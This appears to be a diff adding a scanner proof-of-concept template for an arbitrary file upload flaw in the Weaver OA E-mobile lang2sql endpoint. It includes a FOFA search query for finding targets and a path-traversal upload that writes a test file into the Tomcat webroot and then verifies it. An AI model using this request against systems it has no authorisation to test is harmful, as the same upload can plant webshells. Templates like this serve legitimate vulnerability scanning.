@@ -1,0 +1,29 @@
+id: poc-yaml-weaver-oa-e-mobile-lang2sql-anyfile-upload
+info:
+  name: 泛微OA E-mobile lang2sql 任意文件上传漏洞
+  severity: critical
+  tags:
+  - sql-injection
+  finger: e-mobile
+  fofa: title="移动管理平台-企业管理" && port="9443"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /emp/lang2sql?client_type=1&lang_tag=1
+  headers:
+    Content-Type: multipart/form-data;boundary=----test
+  data: '------test
+
+    Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/{{.t1}}.txt"
+
+
+    {{.t2}}
+
+    ------test--'
+  expression: status_code == 200 && contains(body,"500") && contains(body,"未知异常")
+- method: GET
+  path: /{{.t1}}.txt
+  expression: status_code == 200 && contains(body,t2)
+transport: http
